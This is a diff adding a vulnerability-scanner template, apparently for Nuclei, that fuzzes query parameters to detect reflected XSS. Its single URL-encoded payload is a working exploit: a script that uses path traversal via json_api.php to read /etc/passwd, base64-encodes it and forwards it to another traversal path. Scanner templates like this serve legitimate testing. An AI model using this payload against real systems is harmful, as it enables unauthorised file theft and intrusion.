@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-fetch
+
+info:
+  name: Reflection XSS Detection with Fetch
+  author: netbaan
+  severity: low
+  description: |
+    This template tests for reflective XSS vulnerabilities by injecting a fetch request into the response using a specific payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss_payload:
+        - "%20%3Cscript%3Efetch%28%27%2Fjson_api.php%3Fquery%5B%5D%3D..%2Fetc%2Fpasswd%27%29.then%28r%20%3D%3E%20r.text%28%29%29.then%28t%20%3D%3E%20fetch%28%27%2Fjson_api.php%3Fquery%5B%5D%3D..%2Frspamd_custom_maps%2F%27%2Bbtoa%28t%29%29%29%3C%2Fscript%3E"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss_payload}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
